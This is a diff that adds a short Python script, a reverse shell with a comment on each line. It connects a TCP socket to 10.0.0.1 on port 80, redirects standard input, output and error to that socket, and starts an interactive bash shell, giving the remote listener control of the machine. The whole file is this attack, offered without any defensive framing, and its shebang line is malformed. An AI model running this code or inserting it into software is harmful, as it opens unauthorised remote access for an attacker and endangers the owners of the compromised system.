@@ -1,0 +1,10 @@
+!/usr/bin/python3 #This is a shebang line which defines the path of the interpreter to use
+from os import dup2 #importing libraries and functions
+from subprocess import run #importing libraries and functions
+import socket #importing libraries and functions
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #Creating our socket object 
+s.connect(("10.0.0.1",80)) #Connecting to a Remote Host
+dup2(s.fileno(),0) #Copying The File Descriptors
+dup2(s.fileno(),1) #Copying The File Descriptors
+dup2(s.fileno(),2) #Copying The File Descriptors
+run(["/bin/bash","-i"]) #Calling our interactive Shell
